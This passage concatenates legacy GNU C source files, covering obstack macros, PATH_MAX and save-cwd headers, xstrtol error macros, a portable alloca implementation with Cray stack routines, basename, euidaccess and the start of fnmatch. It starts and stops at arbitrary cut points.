({ struct obstack *__o = (OBSTACK);					\
   if (__o->next_free + sizeof (int) > __o->chunk_limit)		\
     _obstack_newchunk (__o, sizeof (int));				\
   if (!__o->alloc_failed)						\
     *((int *)__o->next_free)++ = ((int)datum);				\
   (void) 0; })

#define obstack_ptr_grow_fast(h,aptr) (*((void **)(h)->next_free)++ = (void *)aptr)
#define obstack_int_grow_fast(h,aint) (*((int *)(h)->next_free)++ = (int)aint)

#define obstack_blank(OBSTACK,length)					\
__extension__								\
({ struct obstack *__o = (OBSTACK);					\
   int __len = (length);						\
   if (__o->chunk_limit - __o->next_free < __len)			\
     _obstack_newchunk (__o, __len);					\
   if (!__o->alloc_failed)						\
     __o->next_free += __len;						\
   (void) 0; })

#define obstack_alloc(OBSTACK,length)					\
__extension__								\
({ struct obstack *__h = (OBSTACK);					\
   obstack_blank (__h, (length));					\
   obstack_finish (__h); })

#define obstack_copy(OBSTACK,where,length)				\
__extension__								\
({ struct obstack *__h = (OBSTACK);					\
   obstack_grow (__h, (where), (length));				\
   obstack_finish (__h); })

#define obstack_copy0(OBSTACK,where,length)				\
__extension__								\
({ struct obstack *__h = (OBSTACK);					\
   obstack_grow0 (__h, (where), (length));				\
   obstack_finish (__h); })

/* The local variable is named __o1 to avoid a name conflict
   when obstack_blank is called.  */
#define obstack_finish(OBSTACK)  					\
__extension__								\
({ struct obstack *__o1 = (OBSTACK);					\
   void *value;								\
   if (__o1->alloc_failed)						\
     value = 0;								\
   else									\
     {									\
       value = (void *) __o1->object_base;				\
       if (__o1->next_free == value)					\
         __o1->maybe_empty_object = 1;					\
       __o1->next_free							\
	 = __INT_TO_PTR ((__PTR_TO_INT (__o1->next_free)+__o1->alignment_mask)\
			 & ~ (__o1->alignment_mask));			\
       if (__o1->next_free - (char *)__o1->chunk			\
	   > __o1->chunk_limit - (char *)__o1->chunk)			\
	 __o1->next_free = __o1->chunk_limit;				\
       __o1->object_base = __o1->next_free;				\
      }									\
   value; })

#define obstack_free(OBSTACK, OBJ)					\
__extension__								\
({ struct obstack *__o = (OBSTACK);					\
   void *__obj = (OBJ);							\
   if (__obj > (void *)__o->chunk && __obj < (void *)__o->chunk_limit)  \
     __o->next_free = __o->object_base = __obj;				\
   else (obstack_free) (__o, __obj); })

#else /* not __GNUC__ or not __STDC__ */

#define obstack_object_size(h) \
 (unsigned) ((h)->alloc_failed ? 0 : (h)->next_free - (h)->object_base)

#define obstack_room(h)		\
 (unsigned) ((h)->chunk_limit - (h)->next_free)

/* Note that the call to _obstack_newchunk is enclosed in (..., 0)
   so that we can avoid having void expressions
   in the arms of the conditional expression.
   Casting the third operand to void was tried before,
   but some compilers won't accept it.  */

#define obstack_grow(h,where,length)					\
( (h)->temp = (length),							\
  (((h)->next_free + (h)->temp > (h)->chunk_limit)			\
   ? (_obstack_newchunk ((h), (h)->temp), 0) : 0),			\
  ((h)->alloc_failed ? 0 :						\
  (bcopy ((char *) (where), (h)->next_free, (h)->temp),			\
  (h)->next_free += (h)->temp)))

#define obstack_grow0(h,where,length)					\
( (h)->temp = (length),							\
  (((h)->next_free + (h)->temp + 1 > (h)->chunk_limit)			\
   ? (_obstack_newchunk ((h), (h)->temp + 1), 0) : 0),			\
  ((h)->alloc_failed ? 0 :						\
  (bcopy ((char *) (where), (h)->next_free, (h)->temp),			\
  (h)->next_free += (h)->temp,						\
  *((h)->next_free)++ = 0)))

#define obstack_1grow(h,datum)						\
( (((h)->next_free + 1 > (h)->chunk_limit)				\
   ? (_obstack_newchunk ((h), 1), 0) : 0),				\
 ((h)->alloc_failed ? 0 :						\
  (*((h)->next_free)++ = (datum))))

#define obstack_ptr_grow(h,datum)					\
( (((h)->next_free + sizeof (char *) > (h)->chunk_limit)		\
   ? (_obstack_newchunk ((h), sizeof (char *)), 0) : 0),		\
  ((h)->alloc_failed ? 0 :						\
  (*((char **)(((h)->next_free+=sizeof(char *))-sizeof(char *))) = ((char *)datum))))

#define obstack_int_grow(h,datum)					\
( (((h)->next_free + sizeof (int) > (h)->chunk_limit)			\
   ? (_obstack_newchunk ((h), sizeof (int)), 0) : 0),			\
  ((h)->alloc_failed ? 0 :						\
  (*((int *)(((h)->next_free+=sizeof(int))-sizeof(int))) = ((int)datum))))

#define obstack_ptr_grow_fast(h,aptr) (*((char **)(h)->next_free)++ = (char *)aptr)
#define obstack_int_grow_fast(h,aint) (*((int *)(h)->next_free)++ = (int)aint)

#define obstack_blank(h,length)						\
( (h)->temp = (length),							\
  (((h)->chunk_limit - (h)->next_free < (h)->temp)			\
   ? (_obstack_newchunk ((h), (h)->temp), 0) : 0),			\
  ((h)->alloc_failed ? 0 :						\
  ((h)->next_free += (h)->temp)))

#define obstack_alloc(h,length)						\
 (obstack_blank ((h), (length)), obstack_finish ((h)))

#define obstack_copy(h,where,length)					\
 (obstack_grow ((h), (where), (length)), obstack_finish ((h)))

#define obstack_copy0(h,where,length)					\
 (obstack_grow0 ((h), (where), (length)), obstack_finish ((h)))

#define obstack_finish(h)  						\
( (h)->alloc_failed ? 0 :						\
  (((h)->next_free == (h)->object_base					\
   ? (((h)->maybe_empty_object = 1), 0)					\
   : 0),								\
  (h)->temp = __PTR_TO_INT ((h)->object_base),				\
  (h)->next_free							\
    = __INT_TO_PTR ((__PTR_TO_INT ((h)->next_free)+(h)->alignment_mask)	\
		    & ~ ((h)->alignment_mask)),				\
  (((h)->next_free - (char *)(h)->chunk					\
    > (h)->chunk_limit - (char *)(h)->chunk)				\
   ? ((h)->next_free = (h)->chunk_limit) : 0),				\
  (h)->object_base = (h)->next_free,					\
  __INT_TO_PTR ((h)->temp)))

#if defined (__STDC__) && __STDC__
#define obstack_free(h,obj)						\
( (h)->temp = (char *)(obj) - (char *) (h)->chunk,			\
  (((h)->temp > 0 && (h)->temp < (h)->chunk_limit - (char *) (h)->chunk)\
   ? (int) ((h)->next_free = (h)->object_base				\
	    = (h)->temp + (char *) (h)->chunk)				\
   : (((obstack_free) ((h), (h)->temp + (char *) (h)->chunk), 0), 0)))
#else
#define obstack_free(h,obj)						\
( (h)->temp = (char *)(obj) - (char *) (h)->chunk,			\
  (((h)->temp > 0 && (h)->temp < (h)->chunk_limit - (char *) (h)->chunk)\
   ? (int) ((h)->next_free = (h)->object_base				\
	    = (h)->temp + (char *) (h)->chunk)				\
   : (_obstack_free ((h), (h)->temp + (char *) (h)->chunk), 0)))
#endif

#endif /* not __GNUC__ or not __STDC__ */

#endif /* not __OBSTACK_H__ */
/* Define PATH_MAX somehow.  Requires sys/types.h.
   Copyright (C) 1992 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifndef _PATHMAX_H
#define _PATHMAX_H

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

/* Non-POSIX BSD systems might have gcc's limits.h, which doesn't define
   PATH_MAX but might cause redefinition warnings when sys/param.h is
   later included (as on MORE/BSD 4.3).  */
#if defined(_POSIX_VERSION) || (defined(HAVE_LIMITS_H) && !defined(__GNUC__))
#include <limits.h>
#endif

#ifndef _POSIX_PATH_MAX
#define _POSIX_PATH_MAX 255
#endif

#if !defined(PATH_MAX) && defined(_PC_PATH_MAX)
#define PATH_MAX (pathconf ("/", _PC_PATH_MAX) < 1 ? 1024 : pathconf ("/", _PC_PATH_MAX))
#endif

/* Don't include sys/param.h if it already has been.  */
#if defined(HAVE_SYS_PARAM_H) && !defined(PATH_MAX) && !defined(MAXPATHLEN)
#include <sys/param.h>
#endif

#if !defined(PATH_MAX) && defined(MAXPATHLEN)
#define PATH_MAX MAXPATHLEN
#endif

#ifndef PATH_MAX
#define PATH_MAX _POSIX_PATH_MAX
#endif

#endif /* _PATHMAX_H */
#ifndef SAVE_CWD_H
#define SAVE_CWD_H 1

struct saved_cwd
  {
    int desc;
    char *name;
  };

#ifndef __P
#if defined (__GNUC__) || (defined (__STDC__) && __STDC__)
#define __P(args) args
#else
#define __P(args) ()
#endif  /* GCC.  */
#endif  /* Not __P.  */

int save_cwd __P((struct saved_cwd *cwd));
int restore_cwd __P((const struct saved_cwd *cwd, const char *dest,
		     const char *from));
void free_cwd __P((struct saved_cwd *cwd));

#endif /* SAVE_CWD_H */
#ifndef _xstrtol_h_
#define _xstrtol_h_ 1

#if STRING_TO_UNSIGNED
# define __xstrtol xstrtoul
# define __strtol strtoul
# define __unsigned unsigned
# define __ZLONG_MAX ULONG_MAX
#else
# define __xstrtol xstrtol
# define __strtol strtol
# define __unsigned /* empty */
# define __ZLONG_MAX LONG_MAX
#endif

#undef __P
#if defined (__STDC__) && __STDC__
#define	__P(x) x
#else
#define	__P(x) ()
#endif

enum strtol_error
  {
    LONGINT_OK, LONGINT_INVALID, LONGINT_INVALID_SUFFIX_CHAR, LONGINT_OVERFLOW
  };
typedef enum strtol_error strtol_error;

strtol_error
  __xstrtol __P ((const char *s, char **ptr, int base,
		  __unsigned long int *val, const char *valid_suffixes));

#define _STRTOL_ERROR(exit_code, str, argument_type_string, err)	\
  do									\
    {									\
      switch ((err))							\
	{								\
	case LONGINT_OK:						\
	  abort ();							\
									\
	case LONGINT_INVALID:						\
	  error ((exit_code), 0, "invalid %s `%s'",			\
		 (argument_type_string), (str));			\
	  break;							\
									\
	case LONGINT_INVALID_SUFFIX_CHAR:				\
	  error ((exit_code), 0, "invalid character following %s `%s'",	\
		 (argument_type_string), (str));			\
	  break;							\
									\
	case LONGINT_OVERFLOW:						\
	  /* FIXME: make this message dependent on STRING_TO_UNSIGNED */\
	  error ((exit_code), 0, "%s `%s' larger than maximum long int",\
		 (argument_type_string), (str));			\
	  break;							\
	}								\
    }									\
  while (0)

#define STRTOL_FATAL_ERROR(str, argument_type_string, err)		\
  _STRTOL_ERROR (2, str, argument_type_string, err)

#define STRTOL_FAIL_WARN(str, argument_type_string, err)		\
  _STRTOL_ERROR (0, str, argument_type_string, err)

#endif /* _xstrtol_h_ */
#ifndef _xstrtoul_h_
#define _xstrtoul_h_ 1

#define STRING_TO_UNSIGNED 1
#include "xstrtol.h"

#endif /* _xstrtoul_h_ */
/* alloca.c -- allocate automatically reclaimed memory
   (Mostly) portable public-domain implementation -- D A Gwyn

   This implementation of the PWB library alloca function,
   which is used to allocate space off the run-time stack so
   that it is automatically reclaimed upon procedure exit,
   was inspired by discussions with J. Q. Johnson of Cornell.
   J.Otto Tennant <jot@cray.com> contributed the Cray support.

   There are some preprocessor constants that can
   be defined when compiling for your specific system, for
   improved efficiency; however, the defaults should be okay.

   The general concept of this implementation is to keep
   track of all alloca-allocated blocks, and reclaim any
   that are found to be deeper in the stack than the current
   invocation.  This heuristic does not reclaim storage as
   soon as it becomes invalid, but it will do so eventually.

   As a special case, alloca(0) reclaims storage without
   allocating any.  It is a good idea to use alloca(0) in
   your main control loop, etc. to force garbage collection.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#ifdef emacs
#include "blockinput.h"
#endif

/* If compiling with GCC 2, this file's not needed.  */
#if !defined (__GNUC__) || __GNUC__ < 2

/* If someone has defined alloca as a macro,
   there must be some other way alloca is supposed to work.  */
#ifndef alloca

#ifdef emacs
#ifdef static
/* actually, only want this if static is defined as ""
   -- this is for usg, in which emacs must undefine static
   in order to make unexec workable
   */
#ifndef STACK_DIRECTION
you
lose
-- must know STACK_DIRECTION at compile-time
#endif /* STACK_DIRECTION undefined */
#endif /* static */
#endif /* emacs */

/* If your stack is a linked list of frames, you have to
   provide an "address metric" ADDRESS_FUNCTION macro.  */

#if defined (CRAY) && defined (CRAY_STACKSEG_END)
long i00afunc ();
#define ADDRESS_FUNCTION(arg) (char *) i00afunc (&(arg))
#else
#define ADDRESS_FUNCTION(arg) &(arg)
#endif

#if __STDC__
typedef void *pointer;
#else
typedef char *pointer;
#endif

#define	NULL	0

/* Different portions of Emacs need to call different versions of
   malloc.  The Emacs executable needs alloca to call xmalloc, because
   ordinary malloc isn't protected from input signals.  On the other
   hand, the utilities in lib-src need alloca to call malloc; some of
   them are very simple, and don't have an xmalloc routine.

   Non-Emacs programs expect this to call use xmalloc.

   Callers below should use malloc.  */

#ifndef emacs
#define malloc xmalloc
#endif
extern pointer malloc ();

/* Define STACK_DIRECTION if you know the direction of stack
   growth for your system; otherwise it will be automatically
   deduced at run-time.

   STACK_DIRECTION > 0 => grows toward higher addresses
   STACK_DIRECTION < 0 => grows toward lower addresses
   STACK_DIRECTION = 0 => direction of growth unknown  */

#ifndef STACK_DIRECTION
#define	STACK_DIRECTION	0	/* Direction unknown.  */
#endif

#if STACK_DIRECTION != 0

#define	STACK_DIR	STACK_DIRECTION	/* Known at compile-time.  */

#else /* STACK_DIRECTION == 0; need run-time code.  */

static int stack_dir;		/* 1 or -1 once known.  */
#define	STACK_DIR	stack_dir

static void
find_stack_direction ()
{
  static char *addr = NULL;	/* Address of first `dummy', once known.  */
  auto char dummy;		/* To get stack address.  */

  if (addr == NULL)
    {				/* Initial entry.  */
      addr = ADDRESS_FUNCTION (dummy);

      find_stack_direction ();	/* Recurse once.  */
    }
  else
    {
      /* Second entry.  */
      if (ADDRESS_FUNCTION (dummy) > addr)
	stack_dir = 1;		/* Stack grew upward.  */
      else
	stack_dir = -1;		/* Stack grew downward.  */
    }
}

#endif /* STACK_DIRECTION == 0 */

/* An "alloca header" is used to:
   (a) chain together all alloca'ed blocks;
   (b) keep track of stack depth.

   It is very important that sizeof(header) agree with malloc
   alignment chunk size.  The following default should work okay.  */

#ifndef	ALIGN_SIZE
#define	ALIGN_SIZE	sizeof(double)
#endif

typedef union hdr
{
  char align[ALIGN_SIZE];	/* To force sizeof(header).  */
  struct
    {
      union hdr *next;		/* For chaining headers.  */
      char *deep;		/* For stack depth measure.  */
    } h;
} header;

static header *last_alloca_header = NULL;	/* -> last alloca header.  */

/* Return a pointer to at least SIZE bytes of storage,
   which will be automatically reclaimed upon exit from
   the procedure that called alloca.  Originally, this space
   was supposed to be taken from the current stack frame of the
   caller, but that method cannot be made to work for some
   implementations of C, for example under Gould's UTX/32.  */

pointer
alloca (size)
     unsigned size;
{
  auto char probe;		/* Probes stack depth: */
  register char *depth = ADDRESS_FUNCTION (probe);

#if STACK_DIRECTION == 0
  if (STACK_DIR == 0)		/* Unknown growth direction.  */
    find_stack_direction ();
#endif

  /* Reclaim garbage, defined as all alloca'd storage that
     was allocated from deeper in the stack than currently. */

  {
    register header *hp;	/* Traverses linked list.  */

#ifdef emacs
    BLOCK_INPUT;
#endif

    for (hp = last_alloca_header; hp != NULL;)
      if ((STACK_DIR > 0 && hp->h.deep > depth)
	  || (STACK_DIR < 0 && hp->h.deep < depth))
	{
	  register header *np = hp->h.next;

	  free ((pointer) hp);	/* Collect garbage.  */

	  hp = np;		/* -> next header.  */
	}
      else
	break;			/* Rest are not deeper.  */

    last_alloca_header = hp;	/* -> last valid storage.  */

#ifdef emacs
    UNBLOCK_INPUT;
#endif
  }

  if (size == 0)
    return NULL;		/* No allocation required.  */

  /* Allocate combined header + user data storage.  */

  {
    register pointer new = malloc (sizeof (header) + size);
    /* Address of header.  */

    ((header *) new)->h.next = last_alloca_header;
    ((header *) new)->h.deep = depth;

    last_alloca_header = (header *) new;

    /* User storage begins just after header.  */

    return (pointer) ((char *) new + sizeof (header));
  }
}

#if defined (CRAY) && defined (CRAY_STACKSEG_END)

#ifdef DEBUG_I00AFUNC
#include <stdio.h>
#endif

#ifndef CRAY_STACK
#define CRAY_STACK
#ifndef CRAY2
/* Stack structures for CRAY-1, CRAY X-MP, and CRAY Y-MP */
struct stack_control_header
  {
    long shgrow:32;		/* Number of times stack has grown.  */
    long shaseg:32;		/* Size of increments to stack.  */
    long shhwm:32;		/* High water mark of stack.  */
    long shsize:32;		/* Current size of stack (all segments).  */
  };

/* The stack segment linkage control information occurs at
   the high-address end of a stack segment.  (The stack
   grows from low addresses to high addresses.)  The initial
   part of the stack segment linkage control information is
   0200 (octal) words.  This provides for register storage
   for the routine which overflows the stack.  */

struct stack_segment_linkage
  {
    long ss[0200];		/* 0200 overflow words.  */
    long sssize:32;		/* Number of words in this segment.  */
    long ssbase:32;		/* Offset to stack base.  */
    long:32;
    long sspseg:32;		/* Offset to linkage control of previous
				   segment of stack.  */
    long:32;
    long sstcpt:32;		/* Pointer to task common address block.  */
    long sscsnm;		/* Private control structure number for
				   microtasking.  */
    long ssusr1;		/* Reserved for user.  */
    long ssusr2;		/* Reserved for user.  */
    long sstpid;		/* Process ID for pid based multi-tasking.  */
    long ssgvup;		/* Pointer to multitasking thread giveup.  */
    long sscray[7];		/* Reserved for Cray Research.  */
    long ssa0;
    long ssa1;
    long ssa2;
    long ssa3;
    long ssa4;
    long ssa5;
    long ssa6;
    long ssa7;
    long sss0;
    long sss1;
    long sss2;
    long sss3;
    long sss4;
    long sss5;
    long sss6;
    long sss7;
  };

#else /* CRAY2 */
/* The following structure defines the vector of words
   returned by the STKSTAT library routine.  */
struct stk_stat
  {
    long now;			/* Current total stack size.  */
    long maxc;			/* Amount of contiguous space which would
				   be required to satisfy the maximum
				   stack demand to date.  */
    long high_water;		/* Stack high-water mark.  */
    long overflows;		/* Number of stack overflow ($STKOFEN) calls.  */
    long hits;			/* Number of internal buffer hits.  */
    long extends;		/* Number of block extensions.  */
    long stko_mallocs;		/* Block allocations by $STKOFEN.  */
    long underflows;		/* Number of stack underflow calls ($STKRETN).  */
    long stko_free;		/* Number of deallocations by $STKRETN.  */
    long stkm_free;		/* Number of deallocations by $STKMRET.  */
    long segments;		/* Current number of stack segments.  */
    long maxs;			/* Maximum number of stack segments so far.  */
    long pad_size;		/* Stack pad size.  */
    long current_address;	/* Current stack segment address.  */
    long current_size;		/* Current stack segment size.  This
				   number is actually corrupted by STKSTAT to
				   include the fifteen word trailer area.  */
    long initial_address;	/* Address of initial segment.  */
    long initial_size;		/* Size of initial segment.  */
  };

/* The following structure describes the data structure which trails
   any stack segment.  I think that the description in 'asdef' is
   out of date.  I only describe the parts that I am sure about.  */

struct stk_trailer
  {
    long this_address;		/* Address of this block.  */
    long this_size;		/* Size of this block (does not include
				   this trailer).  */
    long unknown2;
    long unknown3;
    long link;			/* Address of trailer block of previous
				   segment.  */
    long unknown5;
    long unknown6;
    long unknown7;
    long unknown8;
    long unknown9;
    long unknown10;
    long unknown11;
    long unknown12;
    long unknown13;
    long unknown14;
  };

#endif /* CRAY2 */
#endif /* not CRAY_STACK */

#ifdef CRAY2
/* Determine a "stack measure" for an arbitrary ADDRESS.
   I doubt that "lint" will like this much. */

static long
i00afunc (long *address)
{
  struct stk_stat status;
  struct stk_trailer *trailer;
  long *block, size;
  long result = 0;

  /* We want to iterate through all of the segments.  The first
     step is to get the stack status structure.  We could do this
     more quickly and more directly, perhaps, by referencing the
     $LM00 common block, but I know that this works.  */

  STKSTAT (&status);

  /* Set up the iteration.  */

  trailer = (struct stk_trailer *) (status.current_address
				    + status.current_size
				    - 15);

  /* There must be at least one stack segment.  Therefore it is
     a fatal error if "trailer" is null.  */

  if (trailer == 0)
    abort ();

  /* Discard segments that do not contain our argument address.  */

  while (trailer != 0)
    {
      block = (long *) trailer->this_address;
      size = trailer->this_size;
      if (block == 0 || size == 0)
	abort ();
      trailer = (struct stk_trailer *) trailer->link;
      if ((block <= address) && (address < (block + size)))
	break;
    }

  /* Set the result to the offset in this segment and add the sizes
     of all predecessor segments.  */

  result = address - block;

  if (trailer == 0)
    {
      return result;
    }

  do
    {
      if (trailer->this_size <= 0)
	abort ();
      result += trailer->this_size;
      trailer = (struct stk_trailer *) trailer->link;
    }
  while (trailer != 0);

  /* We are done.  Note that if you present a bogus address (one
     not in any segment), you will get a different number back, formed
     from subtracting the address of the first block.  This is probably
     not what you want.  */

  return (result);
}

#else /* not CRAY2 */
/* Stack address function for a CRAY-1, CRAY X-MP, or CRAY Y-MP.
   Determine the number of the cell within the stack,
   given the address of the cell.  The purpose of this
   routine is to linearize, in some sense, stack addresses
   for alloca.  */

static long
i00afunc (long address)
{
  long stkl = 0;

  long size, pseg, this_segment, stack;
  long result = 0;

  struct stack_segment_linkage *ssptr;

  /* Register B67 contains the address of the end of the
     current stack segment.  If you (as a subprogram) store
     your registers on the stack and find that you are past
     the contents of B67, you have overflowed the segment.

     B67 also points to the stack segment linkage control
     area, which is what we are really interested in.  */

  stkl = CRAY_STACKSEG_END ();
  ssptr = (struct stack_segment_linkage *) stkl;

  /* If one subtracts 'size' from the end of the segment,
     one has the address of the first word of the segment.

     If this is not the first segment, 'pseg' will be
     nonzero.  */

  pseg = ssptr->sspseg;
  size = ssptr->sssize;

  this_segment = stkl - size;

  /* It is possible that calling this routine itself caused
     a stack overflow.  Discard stack segments which do not
     contain the target address.  */

  while (!(this_segment <= address && address <= stkl))
    {
#ifdef DEBUG_I00AFUNC
      fprintf (stderr, "%011o %011o %011o\n", this_segment, address, stkl);
#endif
      if (pseg == 0)
	break;
      stkl = stkl - pseg;
      ssptr = (struct stack_segment_linkage *) stkl;
      size = ssptr->sssize;
      pseg = ssptr->sspseg;
      this_segment = stkl - size;
    }

  result = address - this_segment;

  /* If you subtract pseg from the current end of the stack,
     you get the address of the previous stack segment's end.
     This seems a little convoluted to me, but I'll bet you save
     a cycle somewhere.  */

  while (pseg != 0)
    {
#ifdef DEBUG_I00AFUNC
      fprintf (stderr, "%011o %011o\n", pseg, size);
#endif
      stkl = stkl - pseg;
      ssptr = (struct stack_segment_linkage *) stkl;
      size = ssptr->sssize;
      pseg = ssptr->sspseg;
      result += size;
    }
  return (result);
}

#endif /* not CRAY2 */
#endif /* CRAY */

#endif /* no alloca */
#endif /* not GCC version 2 */
/* basename.c -- return the last element in a path
   Copyright (C) 1990 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

/* Return NAME with any leading path stripped off.
   Don't use strrchr/rindex.  */

char *
basename (name)
     const char *name;
{
  const char *base = name;

  while (*name)
    {
      if (*name == '/')
	base = name + 1;
      ++name;
    }
  return (char *) base;
}
/* euidaccess -- check if effective user id can access file
   Copyright (C) 1990, 1991, 1995 Free Software Foundation, Inc.

This file is part of the GNU C Library.

The GNU C Library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

The GNU C Library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with the GNU C Library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 675 Mass Ave,
Cambridge, MA 02139, USA.  */

/* Written by David MacKenzie and Torbjorn Granlund.
   Adapted for GNU C library by Roland McGrath.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <sys/types.h>
#include <sys/stat.h>

#ifdef S_IEXEC
# ifndef S_IXUSR
#  define S_IXUSR S_IEXEC
# endif
# ifndef S_IXGRP
#  define S_IXGRP (S_IEXEC >> 3)
# endif
# ifndef S_IXOTH
#  define S_IXOTH (S_IEXEC >> 6)
# endif
#endif /* S_IEXEC */

#if defined (HAVE_UNISTD_H) || defined (_LIBC)
# include <unistd.h>
#endif

#ifdef _POSIX_VERSION
# include <limits.h>
# if !defined(NGROUPS_MAX) || NGROUPS_MAX < 1
#  undef NGROUPS_MAX
#  define NGROUPS_MAX sysconf (_SC_NGROUPS_MAX)
# endif /* NGROUPS_MAX */

#else /* not _POSIX_VERSION */
uid_t getuid ();
gid_t getgid ();
uid_t geteuid ();
gid_t getegid ();
# include <sys/param.h>
# if !defined(NGROUPS_MAX) && defined(NGROUPS)
#  define NGROUPS_MAX NGROUPS
# endif /* not NGROUPS_MAX and NGROUPS */
#endif /* not POSIX_VERSION */

#include <errno.h>
#ifndef errno
extern int errno;
#endif

#if defined(EACCES) && !defined(EACCESS)
# define EACCESS EACCES
#endif

#ifndef F_OK
# define F_OK 0
# define X_OK 1
# define W_OK 2
# define R_OK 4
#endif

#if !defined (S_IROTH) && defined (R_OK)
# define S_IROTH R_OK
#endif

#if !defined (S_IWOTH) && defined (W_OK)
# define S_IWOTH W_OK
#endif

#if !defined (S_IXOTH) && defined (X_OK)
# define S_IXOTH X_OK
#endif

#ifdef _LIBC

# define group_member __group_member

#else

/* The user's real user id. */
static uid_t uid;

/* The user's real group id. */
static gid_t gid;

/* The user's effective user id. */
static uid_t euid;

/* The user's effective group id. */
static gid_t egid;

/* Nonzero if UID, GID, EUID, and EGID have valid values. */
static int have_ids = 0;

# ifdef HAVE_GETGROUPS
int group_member ();
# else
#  define group_member(gid)	0
# endif

#endif


/* Return 0 if the user has permission of type MODE on file PATH;
   otherwise, return -1 and set `errno' to EACCESS.
   Like access, except that it uses the effective user and group
   id's instead of the real ones, and it does not check for read-only
   filesystem, text busy, etc. */

int
euidaccess (path, mode)
     const char *path;
     int mode;
{
  struct stat stats;
  int granted;

#ifdef	_LIBC
  uid_t uid = getuid (), euid = geteuid ();
  gid_t gid = getgid (), egid = getegid ();
#else
  if (have_ids == 0)
    {
      have_ids = 1;
      uid = getuid ();
      gid = getgid ();
      euid = geteuid ();
      egid = getegid ();
    }
#endif

  if (uid == euid && gid == egid)
    /* If we are not set-uid or set-gid, access does the same.  */
    return access (path, mode);

  if (stat (path, &stats))
    return -1;

  mode &= (X_OK | W_OK | R_OK);	/* Clear any bogus bits. */
#if R_OK != S_IROTH || W_OK != S_IWOTH || X_OK != S_IXOTH
  ?error Oops, portability assumptions incorrect.
#endif

  if (mode == F_OK)
    return 0;			/* The file exists. */

  /* The super-user can read and write any file, and execute any file
     that anyone can execute. */
  if (euid == 0 && ((mode & X_OK) == 0
		    || (stats.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH))))
    return 0;

  if (euid == stats.st_uid)
    granted = (unsigned) (stats.st_mode & (mode << 6)) >> 6;
  else if (egid == stats.st_gid || group_member (stats.st_gid))
    granted = (unsigned) (stats.st_mode & (mode << 3)) >> 3;
  else
    granted = (stats.st_mode & mode);
  if (granted == mode)
    return 0;
  errno = EACCESS;
  return -1;
}
/* Copyright (C) 1991, 1992, 1993 Free Software Foundation, Inc.

NOTE: The canonical source of this file is maintained with the GNU C Library.
Bugs can be reported to bug-glibc@prep.ai.mit.edu.

This program is free software; you can redistribute it and/or modify it
under the terms of the GNU General Public License as published by the
Free Software Foundation; either version 2, or (at your option) any
later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.  */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <errno.h>
#include <fnmatch.h>
#include <ctype.h>


/* Comment out all this code if we are using the GNU C Library, and are not
   actually compiling the library itself.  This code is part of the GNU C
   Library, but also included in many other GNU distributions.  Compiling
   and linking in this code is a waste when using the GNU C library
   (especially if it is a shared library).  Rather than having every GNU
   program understand `configure --with-gnu-libc' and omit the object files,
   it is simpler to just do this in the source for each such file.  */

#if defined (_LIBC) || !defined (__GNU_LIBRARY__)


#ifndef errno
extern int errno;
#endif

/* Match STRING against the filename pattern PATTERN, returning zero if
   it matches, nonzero if not.  */
int
fnmatch (pattern, string, flags)
     const char *pattern;
     const char *string;
     int flags;
{
  register const char *p = pattern, *n = string;
  register char c;

/* Note that this evalutes C many times.  */
#define FOLD(c)	((flags & FNM_CASEFOLD) && isupper (c) ? tolower (c) : (c))

  while ((c = *p++) != '\0')
    {
      c = FOLD (c);

      switch (c)
	{
	case '?':
	  if (*n == '\0')
	    return FNM_NOMATCH;
	  else if ((flags & FNM_FILE_NAME) && *n == '/')
	    return FNM_NOMATCH;
	  else if ((flags & FNM_PERIOD) && *n == '.' &&
		   (n == string || ((flags & FNM_FILE_NAME) && n[-1] == '/')))
	    return FNM_NOMATCH;
	  break;

	case '\\':
	  if (!(flags & FNM_NOESCAPE))
	    {
	      c = *p++;
	      c = FOLD (c);
	    }
	  if (FOLD (*n) != c)
	    return FNM_NOMATCH;
	  break;

	case '*':
	  if ((flags & FNM_PERIOD) && *n == '.' &&
	      (n == string || ((flags & FNM_FILE_NAME) && n[-1] == '/')))
	    return FNM_NOMATCH;

	  for (c = *p++; c == '?' || c == '*'; c = *p++, ++n)
	    if (((flags & FNM_FILE_NAME) && *n == '/') ||
		(c == '?' && *n == '\0'))
	      return FNM_NOMATCH;

	  if (c == '\0')
	    return 0;

	  {
	    char c1 = (!(flags & FNM_NOESCAPE) && c == '\\') ? *p : c;
	    c1 = FOLD (c1);
	    for (--p; *n != '\0'; ++n)
	      if ((c == '[' || FOLD (*n) == c1) &&
		  fnmatch (p, n, flags & ~FNM_PERIOD) == 0)
		return 0;
	    return FNM_NOMATCH;
	  }

	case '[':
	  {
